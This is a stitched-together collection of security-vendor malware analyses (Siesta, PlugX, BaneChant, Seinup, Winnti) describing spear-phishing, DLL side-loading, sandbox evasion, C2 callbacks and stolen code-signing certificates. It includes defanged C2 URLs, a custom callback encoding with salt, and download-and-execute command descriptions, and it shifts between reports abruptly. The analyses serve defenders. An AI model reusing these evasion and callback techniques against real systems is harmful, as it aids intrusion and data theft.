It enumerates through process windows , looking for Internet Explorer processes and subclasses the window to steal all web browsing content and write it to c : \documents and settings\All Users\Application Data\sys32dll.txt , encrypting the data and sending stolen data back to the C2 .
In the past few weeks , we have received several reports of targeted attacks that exploited various application vulnerabilities to infiltrate various organizations .
Similar to the Safe Campaign , the campaigns we noted went seemingly unnoticed and under the radar .
The attackers orchestrating the campaign we call the Siesta Campaign used multicomponent malware to target certain institutions that fall under the following industries : Consumer goods and services Energy Finance Healthcare Media and telecommunications Public administration Security and defense Transport and traffic Threat actors do n't always rely on complex attack vectors to infiltrate an organization 's network .
Attackers can also make use of basic social engineering techniques for their victims to take the bait , such as in our case study below .
The Siesta Campaign : A Case Study We are currently investigating an incident that involved attackers sending out spear - phishing emails addressed to executives of an undisclosed company .
These emails were sent from spoofed email addresses of personnel within the organization .
Instead of using attachments and document exploits , this specific campaign served their malware through a legitimate - looking file download link .
To lure the target into downloading the file , the attacker serves the archive under a URL path named after the target organization 's name as cited below : http : // { malicious domain } / { organization name } / { legitimate archive name } .zip
This archive contains an executable ( TROJ_SLOTH ) disguised as a PDF document .
When executed , it drops and opens a valid PDF file , which was most probably taken from the target organization 's website .
Along with this valid PDF file , another malicious component is also dropped and executed in the background .
This backdoor component is named google { BLOCKED } .exe
Trend Micro identifies these samples as BKDR_SLOTH.B .
At this point , the malware begins waiting for additional commands from the attacker .
The encrypted commands that are accepted are : Sleep : Commands the backdoor to sleep for specified number of minutes We have received a sleep command of `` sleep:120 '' during our analysis which means that the malware will wait for 2hrs before establishing a connection again to the C & C server Download : < download_url > Commands the backdoor to download and execute a file ( most probably another Win32 executable ) from a specified URL The C & C servers used in this campaign are found to be newly registered and also short - lived , making it difficult for us to track the malware 's behavior .
Based on our research , we found 2 variants of the malware used in this campaign .
Although not exactly alike , the behaviors are nearly identical .
One of the similar samples is a file named Questionaire Concerning the Spread of Superbugs February 2014.exe ( SHA1 : 014542eafb792b98196954373b3fd13e60cb94fe ) .
This sample drops the file UIODsevr.exe , its backdoor component which behaves similarly as BKDR_SLOTH.B with the addition of communicating to its C & C at skys { BLOCKED } com .
These samples are identified by Trend Micro as BKDR_SLOTH.A .
Both variants excessively use Sleep calls , which renders the malware dormant for varying periods of time , hence the campaign name `` Siesta '' ( which means to take a short nap in Spanish ) .
Commands are being served through HTML pages using different keywords as listed below : Variant 1 prefix : `` > SC < `` Variant 2 prefix : `` longDesc= '' suffix : `` .txt
We were able to identify this new campaign through inspecting hashes , C & Cs , registrants , commands , and additional information .
Figure 1 .
Attribution Graph ( click the thumbnail for full view ) During the course of our investigation into this new campaign , we investigated the malware dropped .
We quickly noticed the registrant of sky { BLOCKED } .com
This individual used the name Li Ning and others with an email address of xiaomao { BLOCKED } @ 163.com .
This individual also recently registered 79 additional domains .
There are a total of roughly 17,000 domains registered with this same email address .
Figure 2 .
Domains registered under the name Li Ning , based on Whois data Conclusion Early detection is crucial in preventing targeted attacks from exfiltrating confidential company data .
Organizations and large enterprises need an advanced threat protection platform like Trend Micro™ Deep Discovery , which can mitigate the risks posed by targeted attacks through its various security technologies and global threat intelligence .
At the heart of our Custom Defense solution is Deep Discovery which provides real - time local and global intelligence across the attack life cycle .
This can help IT administrators understand the nature of the attack they are dealing with .
Trend Micro blocks all related threats , emails and URLs associated with these attacks .
As always , we advise users to exercise caution when opening emails and links .
With additional insights and analysis from Kervin Alintanahin , Dove Chiu , and Kyle Wilhoit .
This report is the analysis of a Remote Access Tool ( RAT ) which we call a variant of Plugx1 .
Plugx is an interesting piece of malware for several reasons : This work has been done with utmost care , following best practices in software reversing , forensic investigations and/or information gathering .
However , the work is only covering small aspects ( based on the indicators given , lacking full context ) and not an exhaustive analysis , and hence the report is as - is , not giving any guarantees of completeness or claiming absolute accuracy .
This work is provided for information only .
The document is classiﬁed as TLP : WHITE , CIRCL authorizes everyone to share this analysis report as - is without modiﬁcation .
The analyzed malicious software is an exhaustive Remote Access Tool ( RAT ) that defeats several protection methods of modern Windows operating systems , including execution of signed code and defeating UAC in Windows 7 .
It comes with a multitude of functionalities that are well implemented .
The analysis has been done using a mixed - approach of dynamic analysis and static analysis in order to overcome some of the obfuscation and encryptions used by the malware .
Some of the techniques might have also an impact on the interpretation of the malware .
Unfortunately , when we started this investigation , the IP address is no longer accepting connections on the given ports when tested on 2013 - 03 - 26 .
An interaction following the protocol of this malware is therefore no longer possible .
Sample A is a self - extracting archive which contains three ﬁles , Sample B , Sample C and Sample D. It is assumed that Sample A is a part of another attack vector , like PDF or Oﬃce document attacks where the user just opens a crafted document which exploits the document reader , drops and opens both a readable document and a malicious ﬁle like Sample A. Executing the self - extracting archive extracts the ﬁles and runs mcvsmap.exe ( Sample B ) .
Sample B is a valid signed ﬁle that the author of the malware took from a software bundle from McAfee .
Sample B , when executed , attempts to load a ﬁle McUtil . DLL from the same directory , which usually is another component of McAfee .
The malware author instead bundled the valid McAfee ﬁle Sample B with a custom DLL ( Sample C ) .
Since the ﬁle will be loaded without hesitation ( there are no protection mechanisms implemented ; neither does McAfee check if the imported ﬁle meets any conditions nor is any protection implemented for loading unsigned libraries in signed code ) , the signed Sample B jumps into the beginning of the code section of Sample C ( via Push / Return ) : The code retrieves the ﬁlename of itself ( line 3 ) , which is McUtil . DLL , and appends .PPT
A handle to the ﬁlename McUtil . DLL.PPT is created in line 5 .
In line 12 an exectuable memory region is created , which is ﬁlled with the content of the ﬁle McUtil . DLL.PPT ( line 13 ) .
After closing the handle to the ﬁle ( line 15 ) , the memory region is called ( line 16 ) .
The next screenshot shows that the memory contains only pure code without any overhead like MZ / PE headers .
The entropy of this ﬁle is 7.997904 bits per byte : The code , when executed , reveals the ﬁrst hint about what we found : It decompresses and decrypts itself , using the Microsoft API call RtlDecompressBuﬀer and the custom decryption routine : The decrypted and decompressed ﬁle is not written onto disk , it always remains in memory .
Sample E is the extracted version of this memory segment .
At this point it can be mentioned that neither the encrypted Sample D nor the decrypted memory segment Sample E are detected by Virus scanners .
After some initialisation work like adjusting tokens ( SeDebugPrivilege , SeTcbPrivileg6 , to act as part of the operating system ) , a new process is started , the original svchost.exe from Microsoft , and the code from Sample E is injected into the memory of that process .
In a next step , svchost.exe is instructed to execute the original msiexec.exe from Microsoft , where also memory is injected like it has been done for svchost.exe .
Special conditions apply when run under Window 7 , which is protected by User Account Control ( UAC ) .
In the environment of Windows 7 , the malware drops temporarily ﬁle Sample F , which it uses to evade or defeat the UAC mechanism .
After killing the parent processes , only two processes are left : svchost and msiexec .
Both are veriﬁed binaries , none of the includes a malicious DLL .
Nevertheless , they both contain the malicious code .
At this point in time the malware is already talking to the C & C , no user interaction was required , all standard security mechanisms were defeated .
The analysis of Sample B revealed the commands as shown in the table below : Table 1 : Implemented commands XPlugOption implements commands to lock the workstation , shut it down or reboot it .
In addition , XPlugOption can create a thread that calls MessageBoxW ( ) in order to present a message box to the user .
In addition , XPlugDisk can be used to create a process , optionally on a hidden Windows desktop with the name `` HH '' , as the code below illustrates : XPlugScreen is not only taking screenshots , it is also implementing remote desktop capabilities .
It is able to capture the screen ( internal command : ScreenT1 ) and can send mouse and keyboard events ( internal command : ScreenT2 ) .
In the module XPlugService commands are available related to Windows services .
Code is implemented to query service conﬁgurations , change service conﬁguration , start , control and delete services .
A remote shell for the attacker is created in the module XPlugShell , by creating an asynchronous set of pipes ( \pipe\a and \pipe\b ) for cmd.exe and the console attached to it ( AttachConsole ( ) ) .
It is able to enumerate , create , delete and copy keys .
It is also able to enumerate , set , delete and get values from the registry .
The keylogger implemented in XPlugKeyLogger catches Window titles , date , time and logs entered keys into the ﬁle It has the format following the example below : This function is called almost everywhere when the author expects that a functions returns an error , at 1036 places .
This is obviously done to ensure code quality .
Example log ﬁle entries from ﬁle In addition an exception ﬁlter is installed to fetch the circumstances of otherwise not caught errors : The three ﬁles Sample B , C and D are copied into the directory respectively in After that , a new registry entry is set : which calls mcvsmap.exe ( Sample B ) after login .
Another option is the installation as a service in The key `` Imagepath '' calls the same binary mcvsmap.exe ( Sample B ) .
The attacked computer uses TCP and UDP to connect to port 443 on help.yahoo-upgrade.com ( 122.199.194.197 ) .
Unfortunately , the machine at that IP address does n't seem to reply to our requests anymore on 2013 - 03 - 26 .
The Passive DNS showed some other associated domains and hostnames with this IP address : It 's highly probable that theses hostnames were also used for other campaigns .
You might use these as additional indicators for the detection of potential infections .
The IP address is located in the ASN 17877 and the ISP is not a known bulletproof hoster as you can see on its historical7 BGP ranking evolution .
A version string can be found in this binary : This could mean PlugX , version 7.0 codename fking , build for mcvsmap .
References can be found on the internet for previous versions of this malware family : This section summarizes the known indicators of compromise .
The list might not be exhaustive , but the existence of any or all of the following indicators might help to discover an infection .
Last December , our senior malware researcher ( Mr. Abhishek Singh ) posted an article about a Trojan which could detect mouse clicks to evade sandbox analysis .
Interestingly , we have found another spear phishing document that downloads malware which incorporates improved mouse click detection anti- sandboxing capability .
It also leverages multiple advanced evasion techniques to achieve stealth and persistent infection .
The name of malicious document is translated to be `` Islamic Jihad.doc '' .
Hence , we suspect that this weaponized document was used to target the governments of Middle East and Central Asia .
This new malware is significant for several reasons : It detects multiple mouse clicks : In the past , evasion methods using mouse clicks only detected a single click , making the malware fairly easy to overcome .
The callback goes to a legitimate URL : Often when malware performs its callback , the communication goes directly to the CnC server .
In this case , the callback goes to a legitimate URL shortening service , which would then redirect the communication to the CnC server .
Automated blocking technologies are likely to block only the URL shortening service and not the CnC server .
It has anti - forensic capability : This malware does n't kick into high gear immediately .
Instead it requires an Internet connection for malicious code to be downloaded to the memory and executed .
Unlike predecessors that are very obvious and immediately get to work , this malware is merely a husk and its true malicious intent could only be found in the downloaded code .
This prevents forensic investigators from extracting the `` true '' malicious code from the disk .
Overall , this malware was observed to send information about the computer and set up a backdoor for remote access .
This backdoor provides the attacker the flexibility on how malicious activities could be executed .
After opening this malicious document , it attempts to download an XOR encoded binary ( using a two byte XOR key ) for the stage one payload .
It was also observed that the attacker leveraged a shortened URL to '' hide '' malicious domains from automated analysis technologies .
After investigation , the malicious domain was analyzed to be recently registered .
See Figure 1 for the first stage download scenario .
The attacker has designed the stage one malware to be merely a husk .
Having the decrypted executable file alone would not be useful in understanding its intent .
It is because a majority of the malicious code is only available after downloading the second stage payload .
The second stage payload was available as a fake '' JPEG '' file from the malicious server .
By designing the malware this way , it makes it harder to perform incidence response and facilitates ease of update of malicious code .
Again , in this second stage download , the malicious domain was not found in the malware .
It made use of the dynamic DNS service provided by '' NO - IP '' to indirectly access the malicious domain .
See Figure 2 for the second stage download scenario .
The technical details of each component ( shellcode and payload ) will be further elaborated .
The spear phishing document was in RTF format which as designed loads MSCOMCTL.ocx and exploits CVE 2012 - 0158 .
By executing return at 0x27606EFF , it will load EIP with address 0x27583C30 which is translated to be JMP ESP to execute shellcode in the stack .
See the figure below .
Like most modern shellcode , its stub decrypts its body using a simple XOR key ( see Figure 4 ) .
By stepping through the shellcode , it attempts to download hxxp : //ow.ly / iGKKT and saves it to the temp directory with a file name prefixed with `` moo '' , e.g. , `` moo1.tmp '' ( see Figure 5 ) .
It is important to note that `` ow.ly '' is not a malicious domain .
Instead , it is a URL shortening server .
It is believed that the rational for such indirect access is to defeat automated URL blacklisting .
Figure 6 depicts how a malicious URL could be shortened using this service .
From the network traffic , it is obvious that the real malicious content is located at hxxp : //symbisecure.com / update / winword.pkg ( see Figure 7 ) .
As an excecutable file usually contains many zeros in series , the zeros would become the XOR key when XOR encoded .
For example , 0xAA xor 0×00 equals to 0xAA .
By examining the content using a hex editor , it is obvious that there are many `` 9E 44 '' repeated .
Hence , by trying 0x449E ( little endian ) as an XOR key , it would reveal that it is a PE file .
At offset zero , it is decrypted to be `` MZ '' ; at offset 0x3C , it is decrypted to be 0x00000E0 ; and at 0x000000E0 , it is decrypted to be PE ( see Figure 8 ) .
By generalizing this idea , the single or double byte XOR key can be seen as a dword XOR key as it repeats over itself .
For example , 0x449E XOR key could be seen as 0x449E449E .
By counting the DWORD with the highest occurance , it could be a probable XOR key if the file is XOR encrypted .
This should work for samples that are ( 1 , 2 or 4 , but not 3 bytes ) XOR encrypted .
Even though `` winword.pkg '' is an executable husk to host malicious code downloaded at the second stage , it contains a mouse - click check to detect human behaviors .
Only if the number of left clicks is three or more , will the malware proceed further to download the second stage payload – the true malicious code ( see Figure 9 and Figure 10 ) .
After the malware detects sufficient mouse clicks , it proceeds to decrypt its malicious URL to download the second stage payload ( see Figure 11 ) .
By following the TCP stream ( see Figure 12 ) and examining the header of the downloaded JPG file , it is obvious that downloaded content is not a JPEG file .
By doing so , it effectively downloaded an executable content that is not conformed to PE format to defeat network binary extraction .
A legitimate JPG file should contain the byte sequence `` FFD8FFE0xxxx4A46494600 '' at offset zero , where `` 4A464946 '' corresponds to `` JFIF '' .
Below is the hardcoded URL and user - agent that is used by this malware sample .
This link file will execute a copy of itself located at '' C : \ProgramData\Google2\GoogleUpdate.exe '' ( see Figure 13 ) .
It would look legitimate to users as it masquerades as a legitimate Google Updater .
It `` would '' appear normal if it attempts to access the Internet .
In comparison , the real `` GoogleUpdate.exe '' resides in `` program files '' instead `` program data '' directory ( see Figure 14 ) .
The downloaded `` JPG '' file was analyzed to be a backdoor in the victim 's machine .
It lists the running processes , IP configuration , and directories of root drives ( C to H ) as depicted in Figure 15 .
This information is posted to hxxp : //symbisecure.com / adserv / get.php in Base-64 format .
After decoding , it is interesting that it begins with a Tag named `` BaneChant '' .
After doing a quick search , it seems to be a sound track composed by Hans Zimmer for the movie `` The Dark Knight Rises '' ( see Figure 16 ) .
This is the reason we name this malware Trojan . APT.BaneChant .
As depicted in Figure 17 , the malware could perform other tasks as listed below .
Command ' g ' : Download and execute a file .
The downloaded file has a temporarily file name prefixed with `` java '' .
Command ' i ' : Run downloaded code ( fileless ) as a separate thread .
The user - agent used is `` Mozilla/5.0 ( Windows NT 5.1 ) AppleWebKit/535.1 ( KHTML , like Gecko ) '' .
Command ' x ' : Download and execute , follow by an uninstallation of `` GoogleUpdate.exe '' .
The downloaded file has same prefix `` java '' .
Command ' u ' : Uninstall `` GoogleUpdate.exe '' As defense technologies advance , malware also evolves .
In this instance , we could see that the malware has performed a number of tricks to defeat detection .
It attempts to : 1 .
Evade sandbox by detecting human behaviors ( multiple mouse clicks ) ; 2 .
Evade network binary extraction technology by performing multi - byte XOR encryption on executable file ; 3 .
Social engineer user into thinking that the malware is legitimate ; 4 .
Avoid forensic and incidence response by using fileless malicious codes ; and 5 .
Prevent automated domain blacklisting by using redirection via URL shortening and Dynamic DNS services .
The FireEye research team has recently identified a number of spear phishing activities targeting Asia and ASEAN .
Of these , one of the spear phishing documents was suspected to have used a potentially stolen document as a decoy .
The rich and contextual details ( body and metadata ) which are not available online lead us to believe this was stolen .
This decoy document mentioned countries such as Brunei , Cambodia , Indonesia , Laos , Malaysia , Myanmar , Philippines , Singapore , Thailand , and Vietnam , which leads us to suspect that these countries are targeted .
As the content of this decoy document is suspected to be a stolen sensitive document , the details will not be published .
This malware was found to have used a number of advance techniques which makes it interesting : 1 .
The malware leverages Google Docs to perform redirection to evade callback detection .
This technique was also found in the malware dubbed `` Backdoor . Makadocs '' reported by Takashi Katsuki ( Katsuki , 2012 ) .
It is heavily equipped with a variety of cryptographic functions to perform some of its functions securely .
The malicious DLL is manually loaded into memory which hides from DLL listing .
As depicted in the diagram below , the spear phishing document ( which exploits CVE-2012 - 0158 ) creates a decoy document and a malware dropper named exp1ore.exe .
This dropper will then drop wab.exe ( Address Book Application ) and wab32res.dll ( malicious DLL ) inside the temp folder .
By running wab.exe , the malicious DLL named wab32res.dll ( located within the same folder ) will be loaded using DLL side - loading technique .
This will in turn install a copy of wab32res.dll as msnetrsvw.exe inside the windows directory to be registered as Windows service .
By registering as a Windows service , it allows the malware to survive every reboot and persist on the network .
This malware is named `` Trojan . APT.Seinup '' because one of its export functions is named `` seinup '' .
This malware was analysed to be a backdoor that allows the attacker to remote control the infected system .
Based on our threat intelligence and reverse - engineering effort , below are some related domain and MD5 sums .
Please note that some of the domain / IP association may change .
By connecting the malicious server via Google Docs , the malicious communication is protected by the legitimate SSL provided by Google Docs ( see Figure below ) .
One possible way to examine the SSL traffic is to make use of a hardware SSL decrypter within an organisation .
Alternatively , you may want to examine the usage pattern of the users .
Suppose a particular user accesses Google Docs multiple times a day , the organization 's Incident Response team may want to dig deeper to find out if the traffic is triggered by a human or by malware .
Below is the code that is used to construct a URL that retrieves command via Google Docs .
First , the malicious URL is constructed and then encoded .
Next , the malware simply leverages the Google Docs viewer to retrieve the command from the malicious server ( see Figure below ) .
The shellcode encryption technique is fairly standard .
The shellcode has a decryption stub which decrypts its body using the XOR key 0x9E , and this shellcode is used to extract exp1ore.exe ( malware ) and Wor.doc ( benign document ) .
The exp1ore.exe and Wor.doc were found within the spear phishing document encrypted using the same key ( 0xFC ) and technique .
The XOR key decrypts only a non - zero byte ( see Figure 5 ) .
This prevents statistical methods of recovering the XOR key .
The encrypted executable file and benign document were identified to be located inside the spear phishing document at offsets 0×2509 and 0×43509 respectively .
Even though statistical methods may not be useful in identifying the XOR key as the zero bytes are not encrypted , we could use some of the `` known '' strings below to hunt for the XOR key in this situation .
By sliding the known string across the array of bytes to perform a windowed XOR , the key would be revealed when the encoded data is XORed with the known string .
It uses a custom Base64 map to encode its data , and creates a salted digital thumbprint to allow validation of data .
Below describes the steps to validate a callback using an example of the following URL : hxxp : //www.elizabearden.com / waterphp / BYyH.php ? dEIXozUlFzx=5P & wDq=6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk== & k4fJdSp7=cc3237bc79192a096440faca0fdae10 & GvQF2lotIr5bT2= The URL could be generalised as follows : Domain/ < PHP > ? < rand 11 - 13 char > = < A ' > & < rand 3 - 5 char > = < B ' > & < rand 7 - 9 char > = < C ' > & < rand 14 - 16 chars > = < D ' > The definition of A ' , B ' , C ' and D ' are as follows : Let H be the function which encodes binary into hexadecimal characters prepend with `` % '' , if it is not alphanumeric , dash , underscore or dot .
Let B64 be the base 64 encoder using the following custom map , `` URPBnCF1GuJwH2vbkLN6OQ/5S9TVxXKZaMc8defgiWjmo7pqrAstyz0D+El3I4hY '' .
Let PT be the plain text which is in the form of `` < HostName > [ < RunType > ] : < IPAddress > { 1 } '' , where HostName and IPAddress are string , and RunType is a character .
Let A be the random of 3 to 7 characters , and A ' = H ( A ) Let B be B64 ( PT ) , and B ' = H ( B ) Let C be 32 char deliminator , and C ' = H ( C ) Let D be H ( MD5 ( salt + MD5 ( B64 ( PT ) + A + C ) ) ) , salt = `` % ^^*HFH ) * $ FJK ) 234sd2N @ C ( JGl2z94cg23″ , and D ' = H ( D ) Hence , in this case , the specific malicious URL could be applied as follows : Domain/ < PHP > = http : //www.elizabearden.com / waterphp / BYyH.php A ' = `` 5Pb '' B ' = `` 6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S % 2Bw8npH5oAZk== '' C ' = `` cc3237bc79192a096440faca0fdae107 '' D ' = `` 349118df672db38f9e65659874b60b27 '' ( This is the digital signature ) The hash could be verified as follow : B64 ( PT ) + A + C = `` 6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk== '' + `` 5Pb '' + `` cc3237bc79192a096440faca0fdae107 '' MD5 ( B64 ( PT ) + A + C ) = `` 766cf9e96c1a508c59f7ade1c50ecd28 '' MD5 ( salt + MD5 ( B64 ( PT ) + A + C ) ) = MD5 ( `` % ^^*HFH ) * $ FJK ) 234sd2N @ C ( JGl2z94cg23 '' + `` 766cf9e96c1a508c59f7ade1c50ecd28 '' ) = 349118df672db38f9e65659874b60b27 ( This equals to D ' , which means verified ) The encoded plain text ( B ) could be recovered : B64 ( PT ) = `` 6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk== '' ; PT = `` MY_COMPUTER_NAME [ F ] : 192.168.1.1 { 1 } '' , where `` MY_COMPUTER_NAME '' is the hostname , ' F ' is the run type , `` 192.168.1.1 '' is the IP address .
Note : This example is mocked up using a dummy computer name and IP address .
The python code below could be used to decode the custom encoded string ( see Figure below ) .
The malware was found to perform a callback at random intervals so as to evade network investigation when looking for network connections that are performed in a regular interval .
Additionally , even the name of the parameters in the get string have a random length and name , which makes it hard to create a fix signature to detect such callbacks ( see 3.3.1 to understand how a callback is created ) .
On the disk , the malicious code is either encrypted or compressed to evade scanning using signature rules .
Only upon being loaded into memory , does the malicious code ( that appears to be in the form of a DLL ) get manually loaded without the use of Windows 32 API .
In this way , when an investigation is performed , the malicious DLL is not revealed .
Additionally , it makes it much harder for analysis to be performed .
Taking a deeper look at the decrypted malicious code , this malware was found to contain at least the following functions : Download file Download and execute or load library Change sleep duration Open and close interactive sessions Malware is increasingly becoming more contextually advanced .
It attempts to appear as much as possible like legitimate software or documents .
In this example , we would conclude the following .
A potentially stolen document was used as a decoy document to increase its credibility .
It is also a sign that the compromised organisations could be used as a soft target to compromise their business partners and allies .
It is important to put a stop to the malware infection at the very beginning , which is the exploitation phase .
Once a network is compromised , it is increasingly harder to detect such threats .
Anti - incident response / forensic techniques are increasingly used to evade detection .
It would require a keen eye on details and a wealth of experience to identify all these advance techniques .
Carnegie Mellon University .
Retrieved from http : //www.cs.cmu.edu/~fp / courses/15122-f10/misc / rand / mersenne.c0 Katsuki , T. ( 19 Nov , 2012 ) .
Malware Targeting Windows 8 Uses Google Docs .
Retrieved from http : //www.symantec.com / connect / blogs / malware - targeting - windows-8- uses - google - docs-0 I would like to thank several colleagues for their significant contributions on this post : Darien Kindlund , Ned Moran , Nart Villeneuve , and Thoufique Haq .
This research , which started in autumn of 2011 by Kaspersky Lab , is still ongoing .
The subject of this research project is a series of targeted attacks against private companies around the world .
In the research , we reveal activity of one of the hacking groups which has Chinese origins .
This group was named '' Winnti '' .
According to our estimates , the Winnti group has been active for several years and specializes in cyber - attacks against the online video game industry .
The main objective of the group is to steal source code of online game projects as well as digital certificates of legitimate software vendors .
Besides that , they are deeply interested in the set - up of network infrastructure ( including production gaming servers ) and new developments such as conceptual ideas , design and more .
We are n't the first to investigate the attacks attributed to the Winnti group .. It is known that , at least in 2010 , the U.S.- based company HBGary investigated information security incidents related to the Winnti group at one of HBGary 's customers – an American video game production company .
In the autumn of 2011 , a Trojan was detected on a large number of computers – all of them linked by the fact that they were used by players of a popular online game .
It emerged that the piece of malware landed on users ' computers as part of a regular update from the game 's official update server .
Some even suspected that the publisher itself was spying on its customers .
However , it later became clear that the malicious program ended up on the users ' computers by mistake : the cybercriminals were in fact targeting the companies that develop and release computer games .
The computer game publisher whose servers spread the Trojan asked Kaspersky Lab to analyze the malicious program that was found on its update server .
It turned out to be a DLL library compiled for a 64-bit Windows environment and even used a properly signed malicious driver .
The malicious DLL infected gamers ' computers running under either 32-bit or 64-bit operating systems .
It could not start in 32-bit environments , but it could , under certain conditions , launch without the user 's knowledge or consent in 64-bit environments , though no such accidental launches have been detected .
The DLL contained a backdoor payload , or , to be exact , the functionality of a fully - fledged Remote Administration Tool ( RAT ) , which gave the cyber - criminals the ability to control the victim computer without the user 's knowledge .
The malicious module turned out to be the first Trojan for the 64-bit version of Microsoft Windows with valid digital signature that we have seen .
We used to see similar cases before , but in all previous incidents we have seen digital signature abuse , there were only 32-bit applications .
At an early stage of our research , we identified a number of similar backdoors , both 32-bit and 64-bit , in our collection of malware samples .
Thesewere detected under various verdicts .
We grouped them together into a separate family .
Symantec appears to be the first to name these malicious programs ; we kept Symantec 's name – Winnti – in the name of the malware family we created : Backdoor . Win32 ( Win64 ) .Winnti
As for the people behind these attacks involving this remote administration tool , we ended up calling them `` the Winnti group '' .
Interestingly , the digital signature belonged to another video game vendor - a private company known as KOG , based in South Korea .
The main business of this company was MMRPG ( massively multi player online role - playing games ) games , which was identical to the business area of the first victim .
We contacted KOG , whose certificate was used to sign malicious software and notified Verisign , which issued the certificate for KOG .
As a result , the certificate was revoked .
When we discovered the first stolen digital certificate , we did n't realize that stealing the certificates and signing malware for upcoming attacks against other victims was the modus operandi of that group .
In eighteen months , we manage to discover more than a dozen compromised digital certificates .
Moreover , we found that those digital certificates seemed to have been used in attacks organized by other hacking groups , presumably coming from China .
For example , an attack against South Korean social networks Cyworld and Nate in 2011 ( http : //www.bbc.co.uk / news / technology-14323787 ) - the attackers used a Trojan that was digitally signed using the certificate of YNK Japan Inc gaming company .
In fact , this story has long roots dating back to 2011 .
We highly recommend reading this Norman blog post of a similar incident here : http : //blogs.norman.com/2011/security - research / invisible - ynk - a - code - signing - conundrum .
At the same time , in March 2013 , Uyghur activists were targeted by another malware which was digitally signed by another gaming company called MGAME Corp according to http : //www.f- secure.com/weblog/archives/00002524.html We believe that the source of all these stolen certificates is same group which we call Winnti .
This group either has close contacts with other Chinese hacker groups or sells the certificates on the black market in China .
Below is the list of known compromised companies and digital certificates used by the Winnti group in different campaigns : It 's tempting to assume that Advanced Persistent Threats ( APTs ) primarily target high - level institutions : government agencies , ministries , military and political organizations , power stations , chemical plants , critical infrastructure networks , and so on .
In this context , it seems unlikely that a commercial company would be at risk unless it was operating on the scale of Google , Adobe or The New York Times , which was recently targeted by a cyber - attack , and this perception is reinforced by the publicity that attacks on corporations and government organizations usually receive .
However , any company with data that can be effectively monetized is at risk from APTs .
This is exactly what we encountered here : it was not a governmental , political , military , or industrial organization .
The target was specifically gaming companies .
Analyzing the Winnti samples helped to identify who and what were the targets .
We found that we were dealing with targeted attacks : the Winnti team infects companies that develop and release computer games .
It appears the team has been active for quite a while – since 2009 .
It 's difficult to name all the victims of the Winnti team .
Judging by the information that we have at our disposal – namely the tags within malicious programs , the names of the C & C domains , the companies whose digital certificates were stolen to sign malware , and the countries where detection notifications came from – we can say that at least 35 companies were infected by the Winnti malware at some time .
Countries where the affected companies are located : This data demonstrates that the Winnti team targets gaming companies located in various parts of the world , albeit with a strong focus on South East Asia .
This geographic diversity is hardly surprising .
Often , gaming companies ( both publishers and developers ) are international , having representatives and offices worldwide .
Also , it is common practice for gaming companies from various regions to cooperate .
The developers of a game may be located in a different country from its publisher .
When a game eventually reaches markets in regions away from its initial ' home ' , it is often localized and released by other publishers .
In the course of this cooperation , the partner companies often grant each other access to network resources to exchange data associated with the gaming content , including distribution kits , gaming resources , resource assembly kits , etc .
If one company in the network gets infected , it 's easy for the cybercriminals to spread the infection throughout the partnership chain .
During the investigation , we identified more than a hundred malicious programs , each individually compiled to attack a particular company .
Typically , separate command - and - control ( C & C ) domains were assigned to each targeted company .
Virtually all the C & C domains were arranged as follows : a second - level domain was created without a DNS A - record , i.e. , there was no IP address assigned to it .
In cases where there was an A - record , the assigned IP address was typically 127.0.0.1 .
It is also noteworthy that some of the second - level domains that the cybercriminals created for their C & C had very similar names to the domain hosting the site of a certain real gaming company .
And the malicious users ' domain was resolved to the same IP address which the site of the real gaming company used .
In any case , the third - level domains resolved to IP addresses assigned to the attackers ' actual C & C servers .
Sometimes the Winnti team registered their C & C units with public hosts .
Judging by the samples identified , these C & C centers were subdomains of such domains as 6600.org , 8866.org , 9966.org or ddns.net .
From the names of the C & C domains or subdomains , the attack targets or countries of residence could be guessed , as in : ru.gcgame.info kr.zzsoft.info jp.xxoo.co us.nhntech.com fs.nhntech.com as.cjinternet.us The subdomains `` ru '' , `` kr '' , `` jp '' and `` us '' most probably mean that these C & C servers manage bots hosted on the computers of companies located in Russia , South Korea , Japan and the U.S. respectively , while `` fs '' and `` as '' are acronyms for the names of the companies being attacked .
Sometimes Winnti 's malicious programs had a local IP address , such as 192.168.1.136 , specified in the settings for the C & C .
This could mean that , at some point in time , there was an infected computer that did not have a connection to the Internet , but the cybercriminals needed control over it ( it may have been infected while malware was spread via a corporate network ) .
In this case , the cybercriminals deployed a dedicated local C & C server on another compromised computer within the same local network which did have an Internet connection ; via that C & C , the first victim computer could be controlled .
System administrators often try to isolate critical computers from the outside world .
This decreases the probability of haphazard infection , but , apparently , does not always help in a targeted attack .
In the Winnti samples that were detected and analyzed , we found 36 unique C & C domains .
Most probably , this is only a small portion of all existing Winnti C & C domains , as we only managed to obtain some of the samples from this malware family .
This is hardly surprising since these malicious programs are used to execute targeted attacks , so no information is available about many instances of infection ; for this reason , we have no way of obtaining samples of the malware used in these undisclosed attacks .
Knowing the 2nd level domains used by Winnti , we brute forced through all third level sub - domains up to 4 symbols long , and identified those that have the IP addresses of real servers assigned to them .
Having searched through subdomains for a total of 12 second level domains , we identified 227 `` live '' third level domains .
Many of them are C & C servers for Winnti - class malware that have hitherto remained unidentified .
Analyzing the WHOIS data for the 12 second level domains , we found the following list of email addresses used for registration : evilsex @ gmail.com jslee.jcr @ gmail.com whoismydns @ gmail.com googl3 @ live.com wzcc @ cnkker.com apanku2009 @ gmail.com For some of these domains , registration data proved to be the same as those for the domain google.com : Registrant : Google Inc. 1600 Amphitheatre Parkway Mountain View , California 94043 United States + 1.6503300100 Judging by the domain registration data , the Winnti team started their criminal activities as far back as 2007 .
The early domains were involved in spreading rogue anti - virus programs ( FakeAV ) .
From 2009 onwards , domains began to emerge hosting C & C servers for bots used to infect gaming companies .
Apparently , the cybercriminals graduated to relatively large - scale penetrations into the corporate networks of gaming companies starting from 2010 .
The favorite tool of the attackers is a malicious program we call `` Winnti '' .
It has evolved since the first use , but we divide all variants into two generations : 1.x and 2.x .
Our publication describes both variants of this tool .
The second generation ( 2.x ) was used in one of the attacks that we investigated in the active stage and helped the victim to interrupt data transfer and isolate infections in a corporate network .
In addition to that , we observed usage of a popular backdoor known as PlugX , which is believed to have Chinese origins , however used only previously in attacks against Tibetan activists .
As has been stated above , APTs can target any commercial company if cyber - criminals find a way to financially profit from the attack .
So what methods do cyber - criminals use to generate illicit earnings from attacks on gaming companies ? Based on the available information , we have singled out three main monetization schemes that could be used by the Winnti team .
